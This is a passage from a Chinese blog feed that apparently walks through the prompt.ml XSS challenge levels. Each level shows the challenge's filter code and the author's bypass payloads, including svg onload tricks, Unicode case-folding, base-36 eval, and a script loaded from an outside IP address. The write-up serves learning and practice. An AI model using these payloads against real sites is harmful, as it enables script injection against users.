class="line"><span class="comment">//prompt.ml%2f@35.201.152.114/public/xss.js</span></span><br><span class="line">一直不弹窗，打开 F12，发现了下面这个，原来是被Chrome拦截了</span><br><span class="line">Provisional headers are shown</span><br></pre></td></tr></table></figure><h2 id="5-未多行匹配"><a href="#5-未多行匹配" class="headerlink" title="5. 未多行匹配"></a>5. 未多行匹配</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">没开启多行匹配，换行可绕过一些限制，这一点在很多时候都有大用</span><br><span class="line">type=image定义图像形式的提交按钮。</span><br><span class="line"><span class="string">"type=image src onerror</span></span><br><span class="line"><span class="string">="</span>prompt(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="6-form-属性"><a href="#6-form-属性" class="headerlink" title="6. form 属性"></a>6. form 属性</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":1&#125;</span><br><span class="line">vbscript:prompt(1)#&#123;"action":1&#125;</span><br><span class="line"></span><br><span class="line">后面的 action 覆盖了，可以过正则，但我的疑问是覆盖掉了，前面的 action 值不会变吗</span><br><span class="line">看输出的HTML，&lt;form action=<span class="string">''</span> 这里直接是第一个值，验证的时候是<span class="built_in">document</span>.forms[<span class="number">0</span>].action，</span><br><span class="line">应该是这里的问题，再好好想想</span><br></pre></td></tr></table></figure><h2 id="7-长度限制"><a href="#7-长度限制" class="headerlink" title="7. 长度限制"></a>7. 长度限制</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">我的第一想法是，存起来，然后在拼一下，然而不太现实</span><br><span class="line">”&gt;<span class="xml"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>'/*#*/=<span class="string">prompt(1)</span> 直接这样的话长度会超了</span></span></span><br><span class="line"><span class="xml">这个操作太强了</span></span><br><span class="line">"&gt;&lt;svg/a=#"onload='/*#*/prompt(1)'</span><br><span class="line">&lt;p class="comment" title=""&gt;&lt;svg/a="&gt;&lt;/p&gt;&lt;p class="comment" title=""</span><br><span class="line">onload='/*"&gt;&lt;/p&gt;&lt;p class="comment" title="*/prompt(1)'"&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">单引号没必要吧，"&gt;&lt;svg/a=#"onload=/*#*/prompt(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">"&gt;&lt;script x=#"async=#"src="//⒛₨</span><br><span class="line"></span><br><span class="line">&lt;p class="comment" title=""&gt;&lt;script x="&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="comment" title=""async="&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="comment" title=""src="//⒛₨"&gt;&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">Background Info</span><br><span class="line">The async attribute allows to utilize un-closed script elements. So this works in MSIE - a very useful trick: &lt;script src="test.js" async&gt;</span><br></pre></td></tr></table></figure><h2 id="8-换行符"><a href="#8-换行符" class="headerlink" title="8. 换行符"></a>8. 换行符</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/"]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log("'</span> + input + <span class="string">'");        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">补充知识</span><br><span class="line">Javascript 中 valid line separators 除了\r \n，还有:</span><br><span class="line">\u2028 (Line Separator)</span><br><span class="line">\u2029 (Paragraph Separator)</span><br><span class="line">--&gt; 在js中可以当作注释符(单行注释)</span><br><span class="line"></span><br><span class="line">[\U2028]prompt(<span class="number">1</span>)[\u2028]--&gt;</span><br><span class="line">一直不弹窗，字符打不出来？</span><br></pre></td></tr></table></figure><h2 id="9-特殊字符献奇招"><a href="#9-特殊字符献奇招" class="headerlink" title="9. 特殊字符献奇招"></a>9. 特殊字符献奇招</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">code-breaking 中 easy-nodechr 类似，形近字绕过</span><br><span class="line">https:<span class="comment">//www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</span></span><br><span class="line">混入了两个奇特的字符<span class="string">"ı"</span>、<span class="string">"ſ"</span>。</span><br><span class="line">这两个字符的“大写”是I和S。也就是说</span><br><span class="line"><span class="string">"ı"</span>.toUpperCase() == <span class="string">'I'</span>，</span><br><span class="line"><span class="string">"ſ"</span>.toUpperCase() == <span class="string">'S'</span>。</span><br><span class="line">通过这个小特性可以绕过一些限制。</span><br><span class="line"></span><br><span class="line">&lt;ſvg/onload=prompt(<span class="number">1</span>)</span><br><span class="line">此路不通，prompt 大写失效</span><br><span class="line"></span><br><span class="line">unicode码包含了许多国家的语言文字，有一些语言的字母调用Upper函数进行大写，由于没有对应的大写文字，会自动转换为英文字母，而在url中，协议和域名是不区分大小写</span><br><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span>/<span class="attr">href</span>=<span class="string">//127.0.0.1/xss.js</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ſcript</span>/ſ<span class="attr">rc</span>=<span class="string">//127.0.0.1/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="10-多次过滤帮倒忙"><a href="#10-多次过滤帮倒忙" class="headerlink" title="10. 多次过滤帮倒忙"></a>10. 多次过滤帮倒忙</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前后呼应</span><br><span class="line">p<span class="string">'rompt(1)</span></span><br></pre></td></tr></table></figure><h2 id="11"><a href="#11" class="headerlink" title="11."></a>11.</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">小 trick</span><br><span class="line"><span class="string">"string"</span>(prompt(<span class="number">1</span>)) 将正常执行</span><br><span class="line"><span class="string">"(prompt(1))in"</span></span><br><span class="line">这里的 <span class="keyword">in</span> 还可以用 <span class="keyword">instanceof</span> 替代</span><br><span class="line"></span><br><span class="line">Same story <span class="keyword">with</span> alert(<span class="number">1</span>)<span class="keyword">in</span><span class="string">"test"</span>:</span><br><span class="line"><span class="built_in">TypeError</span>: Cannot use <span class="string">'in'</span> operator to search <span class="keyword">for</span> <span class="string">'undefined'</span> <span class="keyword">in</span> test</span><br></pre></td></tr></table></figure><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span>() 不会对 ASCII 字母和数字进行编码，</span><br><span class="line">也不会对这些 ASCII 标点符号进行编码： - _ . ! ~ * <span class="string">' ( ) 。</span></span><br><span class="line"><span class="string">尝试使用 String.fromCharCode(112, 114, 111, 109, 112, 116)，但是 , 被编码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.() 不会被编码，所以可以利用 toString() 构造</span></span><br><span class="line"><span class="string">toString(radix) 中 radix 为 2-36 可以选36使其作为一个进制，将字符包含起来</span></span><br><span class="line"><span class="string">使用parseInt(str, radix) 将字符转为数字之后使用(number).toString(radix) 然后用eval进行调用 </span></span><br><span class="line"><span class="string">注意number有括号，(number).toString(radix) 可简写为 （numbrer..toString(radix) ，字符之间用concat()连接</span></span><br><span class="line"><span class="string">parseInt('</span>prompt<span class="string">', 36) //1558153217</span></span><br><span class="line"><span class="string">eval((1558153217).toString(36))(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">还可以</span></span><br><span class="line"><span class="string">eval(1558153217..toString(36))(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">甚至可以直接暴力循环着self里的函数，找到prompt：</span></span><br><span class="line"><span class="string">for((i)in(self))eval(i)(1)</span></span><br></pre></td></tr></table></figure><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">与第 7 关类似，但是 /* 被过滤</span><br><span class="line">那这里就可以用 HTML 的注释符</span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1<span class="comment">&lt;!--#--&gt;</span>)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">源码将变成：</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--" data-comment='&#123;"id":0&#125;'&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">&lt;p class="comment" title="--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">&lt;!--<span class="string">" data-comment='&#123;"</span>id<span class="string">":1&#125;'&gt;&lt;/p&gt;</span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;prompt(1&lt;!--"</span> data-comment=<span class="string">'&#123;"id":2&#125;'</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">"comment"</span> title=<span class="string">"--&gt;)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>" data-comment='&#123;"id":3&#125;'&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="1-1"><a href="#1-1" class="headerlink" title="-1"></a>-1</h2><h2 id="2-1"><a href="#2-1" class="headerlink" title="-2"></a>-2</h2><h2 id="3"><a href="#3" class="headerlink" title="-3"></a>-3</h2><h2 id="4"><a href="#4" class="headerlink" title="-4"></a>-4</h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台地址：&lt;a href=&quot;http://prompt.ml/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;a href=&quot;http://prompt.ml/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://prompt.
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="xss" scheme="https://wywwzjj.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯 一月 web</title>
    <link href="https://wywwzjj.top/2019/01/30/%E5%AE%89%E6%81%92%E6%9D%AF-%E4%B8%80%E6%9C%88-Web/"/>
    <id>https://wywwzjj.top/2019/01/30/安恒杯-一月-Web/</id>
    <published>2019-01-30T05:56:38.000Z</published>
    <updated>2019-05-02T03:14:21.463Z</updated>
    
